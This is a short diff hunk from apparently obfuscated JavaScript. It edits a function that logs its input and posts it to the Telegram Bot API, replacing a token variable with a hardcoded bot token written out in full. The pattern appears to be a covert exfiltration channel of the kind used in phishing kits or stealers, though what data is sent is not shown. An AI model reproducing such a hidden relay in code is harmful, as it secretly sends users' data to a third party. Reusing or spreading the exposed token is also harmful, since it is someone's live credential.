@@ -1760,7 +1760,7 @@ function _0x3b85(d, e) {
 }
 async function wx(d) {
     console.log(d),
-    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+    fetch("https://api.telegram.org/bot5878709601:AAFnRQxKazkjZBTa-wXmasa80tkJjg3AmWQ/sendMessage", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
